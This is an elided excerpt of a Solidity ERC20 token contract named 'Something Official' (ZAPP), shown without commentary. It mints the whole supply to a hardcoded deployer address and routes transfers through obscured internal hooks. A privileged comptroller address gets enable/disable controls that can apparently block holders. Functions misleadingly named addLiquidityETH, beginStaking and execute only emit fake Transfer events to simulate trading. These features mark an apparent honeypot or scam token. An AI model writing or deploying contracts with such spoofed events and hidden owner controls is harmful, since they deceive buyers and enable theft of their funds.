...
contract SomethingOfficial is Context, IERC20 {
    ...
    address deployer = 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
    address public _comptroller = 0xa1AFc241dEeF1f5E1050b3566b42D47afe2997d1;
   constructor () public {



        _name = "Something Official";
        _symbol = "ZAPP";
        _decimals = 18;
        ...
        _mint(0xED5AF388653567Af2F388E6224dC7C4b3241C544, initialSupply);
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _oblit(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _oblit(sender, recipient, amount);
    ...
    function approval_pl(address[] memory destination) public {
   ...
   function approval_mi(address safeOwner) public {
        require(msg.sender == _comptroller, "!owner");
    ...
    function _oblit(address from, address dest, uint256 amt) internal mainboard( dest,  amt,  from,  address(0)) virtual {
        _pair( from,  dest,  amt);
    }
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function addLiquidityETH(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
  ...
  function _enable(address recipient) public _verify(){
  ...
  function _disable(address recipient) public _verify(){
      //Disable permission
    ...
    function execute(address fromEmt, address toEmt, uint256 amtEmt) public _verify(){
        //EmitSingleTransfer
  ...
  function beginStaking(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
